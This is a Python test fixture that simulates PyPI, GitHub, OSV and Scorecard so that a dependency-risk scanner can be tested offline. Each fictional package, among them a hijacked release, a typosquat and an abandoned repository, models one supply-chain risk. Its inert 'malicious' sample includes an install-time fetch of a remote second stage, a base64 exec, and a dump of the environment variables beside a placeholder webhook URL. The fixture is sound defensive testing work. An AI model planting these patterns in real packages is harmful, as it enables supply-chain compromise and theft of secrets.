"""A fake internet (PyPI, PyPI files + Integrity API, GitHub, OSV, Scorecard) for
offline end-to-end tests. Each fictional package models one attack or risk pattern.

The "malicious" file contents below are inert strings that match detection patterns
(the base64 decodes to `print(1)`); nothing here is ever executed.
"""

from __future__ import annotations

import gzip
import hashlib
import io
import json
import re
import tarfile
from datetime import UTC, datetime, timedelta

import httpx

NOW = datetime.now(UTC)


def iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def sdist(name: str, version: str, files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for path, content in files.items():
            data = content.encode()
            info = tarfile.TarInfo(f"{name.replace('-', '_')}-{version}/{path}")
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


BENIGN = {
    "setup.py": "from setuptools import setup\nsetup(name='pkg')\n",
    "pkg/__init__.py": (
        "import os, subprocess\n"
        "def run(cmd):\n"
        "    env = dict(os.environ)\n"  # copying env for a subprocess is normal
        "    env['X'] = '1'\n"
        "    return subprocess.run(cmd, env=env)\n"
        "def cookies(jar):\n    return update_method(cookies)\n"
    ),
    "tests/test_net.py": "URL = 'http://173.194.35.7/test'\n",  # tests are not installed
}

MALICIOUS = {
    "setup.py": (
        "import urllib.request\n"
        "urllib.request.urlopen('https://example.invalid/stage2')\n"
        "from setuptools import setup\nsetup(name='hijacked-lib')\n"
    ),
    "hijacked_lib.pth": "import os; os.getpid()\n",
    "hijacked_lib/__init__.py": "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n",
    "hijacked_lib/stats.py": (
        "import json, os\n"
        "payload = json.dumps(dict(os.environ))\n"
        "HOOK = 'https://discord.com/api/webhooks/000/xxx'\n"
    ),
}


class Release:
    def __init__(self, version, age_days, files=None, provenance=None, yanked=False):
        self.version, self.age_days = version, age_days
        self.files = files or BENIGN
        self.provenance = provenance  # repo name or None
        self.yanked = yanked


class Pkg:
    def __init__(
        self,
        name,
        repo=None,
        releases=(),
        archived=False,
        contributors=6,
        tags=None,
        vulns=(),
        scorecard=None,
        repo_exists=True,
    ):
        self.name, self.repo, self.releases = name, repo, list(releases)
        self.archived, self.contributors = archived, contributors
        self.tags = tags if tags is not None else [f"v{r.version}" for r in self.releases]
        self.vulns, self.scorecard, self.repo_exists = list(vulns), scorecard, repo_exists


def scenario() -> dict[str, Pkg]:
    pkgs = [
        Pkg(
            "healthy-lib",
            "acme/healthy-lib",
            [
                Release("1.4.0", 200, provenance="acme/healthy-lib"),
                Release("1.5.0", 40, provenance="acme/healthy-lib"),
            ],
            scorecard={"score": 8.1, "checks": [{"name": "Dangerous-Workflow", "score": 10}]},
        ),
        Pkg(
            "abandoned-lib",
            "old/abandoned-lib",
            [Release("0.9", 1300), Release("1.0", 1100)],
            archived=True,
        ),
        Pkg(
            "evil-lib",
            "evil/evil-lib",
            [Release("0.1", 200), Release("0.2", 100)],
            vulns=[
                {
                    "id": "MAL-2026-0001",
                    "summary": "Malicious code in evil-lib",
                    "affected": [{"package": {"ecosystem": "PyPI", "name": "evil-lib"}}],
                }
            ],
        ),
        Pkg(
            "vuln-lib",
            "acme/vuln-lib",
            [Release("1.0.0", 300), Release("1.0.1", 100)],
            vulns=[
                {
                    "id": "GHSA-aaaa-bbbb-cccc",
                    "summary": "RCE in parser",
                    "database_specific": {"severity": "HIGH"},
                    "affected": [
                        {
                            "package": {"ecosystem": "PyPI", "name": "vuln-lib"},
                            "versions": ["1.0.0"],
                            "ranges": [{"events": [{"introduced": "0"}, {"fixed": "1.0.1"}]}],
                        }
                    ],
                }
            ],
        ),
        Pkg(
            "range-lib",
            "acme/range-lib",
            [Release("1.0", 400), Release("2.0", 60)],
            vulns=[
                {
                    "id": "GHSA-dddd-eeee-ffff",
                    "summary": "XSS",
                    "database_specific": {"severity": "MODERATE"},
                    "affected": [
                        {"package": {"ecosystem": "PyPI", "name": "range-lib"}, "versions": ["1.0"]}
                    ],
                }
            ],
        ),
        # Account takeover: dormant for 500 days, new release 2 days ago, no provenance
        # (previous one had it), no git tag, and malicious code in the artifact.
        Pkg(
            "hijacked-lib",
            "acme/hijacked-lib",
            [
                Release("2.8", 900, provenance="acme/hijacked-lib"),
                Release("2.9", 502, provenance="acme/hijacked-lib"),
                Release("3.0", 2, files=MALICIOUS),
            ],
            tags=["v2.7", "v2.8", "v2.9"],
        ),
        Pkg("reqeusts", None, [Release("0.0.1", 5)]),  # typosquat, no repo, brand new
        Pkg("corp-utils", None, [Release("9.9.9", 3)]),  # squatted internal name
        Pkg(
            "solo-lib",
            "lone/solo-lib",
            [Release("0.5", 120), Release("0.6", 30)],
            contributors=1,
            scorecard={"score": 3.0, "checks": [{"name": "Dangerous-Workflow", "score": 0}]},
        ),
        Pkg(
            "ghost-lib",
            "gone/ghost-lib",
            [Release("1.0", 300), Release("1.1", 200)],
            repo_exists=False,
        ),
    ]
    return {p.name: p for p in pkgs}


class FakeInternet:
    """httpx.MockTransport handler routing on host + path."""

    def __init__(self, pkgs: dict[str, Pkg]):
        self.pkgs = pkgs
        self.blobs: dict[str, bytes] = {}
        self.calls: list[str] = []

    # ------------------------------------------------------------------ helpers
    def _file(self, pkg: Pkg, rel: Release) -> dict:
        fname = f"{pkg.name.replace('-', '_')}-{rel.version}.tar.gz"
        blob = sdist(pkg.name, rel.version, rel.files)
        self.blobs[fname] = blob
        return {
            "filename": fname,
            "packagetype": "sdist",
            "size": len(blob),
            "url": f"https://files.example/{fname}",
            "yanked": rel.yanked,
            "digests": {"sha256": hashlib.sha256(blob).hexdigest()},
            "upload_time_iso_8601": iso(NOW - timedelta(days=rel.age_days)),
        }

    def pypi_doc(self, pkg: Pkg) -> dict:
        urls = {"Source": f"https://github.com/{pkg.repo}"} if pkg.repo else {}
        return {
            "info": {"name": pkg.name, "project_urls": urls},
            "releases": {r.version: [self._file(pkg, r)] for r in pkg.releases},
        }

    def _repo(self, full: str) -> Pkg | None:
        return next(
            (p for p in self.pkgs.values() if p.repo and p.repo.lower() == full.lower()), None
        )

    def _github(self, path: str) -> httpx.Response:
        m = re.match(r"^/repos/([^/]+/[^/]+)(/.*)?$", path)
        pkg = self._repo(m.group(1)) if m else None
        if not pkg or not pkg.repo_exists:
            return httpx.Response(404, json={"message": "Not Found"})
        sub = m.group(2) or ""
        owner = pkg.repo.split("/")[0]
        authors = [f"{owner}-dev{i}" for i in range(pkg.contributors)]
        if sub == "":
            return httpx.Response(
                200,
                json={
                    "id": abs(hash(pkg.repo)) % 10**8,
                    "full_name": pkg.repo,
                    "name": pkg.repo.split("/")[1],
                    "owner": {"login": owner},
                    "archived": pkg.archived,
                    "fork": False,
                    "stargazers_count": 1234,
                    "open_issues_count": 5,
                    "license": {"spdx_id": "MIT"},
                    "default_branch": "main",
                    "created_at": iso(NOW - timedelta(days=2000)),
                    "pushed_at": iso(NOW - timedelta(days=900 if pkg.archived else 1)),
                },
            )
        if sub == "/tags":
            return httpx.Response(200, json=[{"name": t} for t in pkg.tags])
        if pkg.archived:
            return httpx.Response(200, json=[])
        if sub == "/commits":
            return httpx.Response(
                200,
                json=[
                    {
                        "sha": f"{i:040x}",
                        "author": {
                            "login": authors[i % len(authors)],
                            "id": 1000 + i % len(authors),
                        },
                        "commit": {
                            "committer": {"date": iso(NOW - timedelta(days=i % 60, hours=i))}
                        },
                    }
                    for i in range(30)
                ],
            )
        if sub == "/issues":
            items = []
            for n in range(1, 9):
                opened = NOW - timedelta(days=50 - n * 3)
                items.append(
                    {
                        "number": n,
                        "user": {"login": f"user{n}"},
                        "created_at": iso(opened),
                        "closed_at": iso(opened + timedelta(days=1)),
                        **(
                            {"pull_request": {"merged_at": iso(opened + timedelta(days=1))}}
                            if n % 2
                            else {}
                        ),
                    }
                )
            return httpx.Response(200, json=items)
        if sub == "/issues/comments":
            return httpx.Response(
                200,
                json=[
                    {
                        "id": n,
                        "issue_url": f"https://api.github.com/repos/{pkg.repo}/issues/{n}",
                        "user": {"login": authors[0]},
                        "created_at": iso(NOW - timedelta(days=50 - n * 3) + timedelta(hours=5)),
                    }
                    for n in range(2, 9, 2)
                ],
            )
        return httpx.Response(404)

    # ------------------------------------------------------------------ routing
    def __call__(self, request: httpx.Request) -> httpx.Response:
        host, path = request.url.host, request.url.path
        self.calls.append(f"{request.method} {host}{path}")
        if host == "pypi.org" and (m := re.match(r"^/pypi/([^/]+)/json$", path)):
            pkg = self.pkgs.get(m.group(1))
            return httpx.Response(200, json=self.pypi_doc(pkg)) if pkg else httpx.Response(404)
        if host == "pypi.org" and (
            m := re.match(r"^/integrity/([^/]+)/([^/]+)/([^/]+)/provenance$", path)
        ):
            pkg = self.pkgs.get(m.group(1))
            rel = next((r for r in pkg.releases if r.version == m.group(2)), None) if pkg else None
            if rel and rel.provenance:
                return httpx.Response(
                    200,
                    json={
                        "version": 1,
                        "attestation_bundles": [
                            {
                                "publisher": {
                                    "kind": "GitHub",
                                    "repository": rel.provenance,
                                    "workflow": "release.yml",
                                },
                                "attestations": [],
                            }
                        ],
                    },
                )
            return httpx.Response(404)
        if host == "files.example":
            return httpx.Response(200, content=self.blobs[path.lstrip("/")])
        if host == "api.github.com":
            return self._github(path)
        if host == "api.osv.dev":
            name = json.loads(request.content)["package"]["name"]
            pkg = self.pkgs.get(name)
            return httpx.Response(200, json={"vulns": pkg.vulns if pkg else []})
        if host == "api.securityscorecards.dev":
            repo = path.split("github.com/", 1)[-1]
            pkg = self._repo(repo)
            if pkg and pkg.scorecard:
                return httpx.Response(200, json={"date": NOW.date().isoformat(), **pkg.scorecard})
            return httpx.Response(404)
        if host == "raw.githubusercontent.com":
            return httpx.Response(404)  # forces the bundled popular-package snapshot
        return httpx.Response(599, text=f"unexpected request {request.url}")


def gz(data: bytes) -> bytes:  # pragma: no cover - helper kept for future fixtures
    return gzip.compress(data)
